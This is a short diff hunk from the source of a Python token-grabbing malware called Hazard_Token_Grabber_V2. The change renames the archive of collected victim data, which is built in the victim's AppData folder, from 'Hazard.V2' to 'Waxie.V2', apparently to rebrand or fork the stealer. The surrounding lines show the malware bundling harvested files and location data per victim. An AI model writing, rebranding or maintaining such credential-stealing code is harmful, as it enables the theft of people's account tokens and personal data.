@@ -503,7 +503,7 @@ class Hazard_Token_Grabber_V2(functions):
             data.get('loc')
 
         _zipfile = os.path.join(
-            self.appdata, f'Hazard.V2-[{Victim}].zip')
+            self.appdata, f'Waxie.V2-[{Victim}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
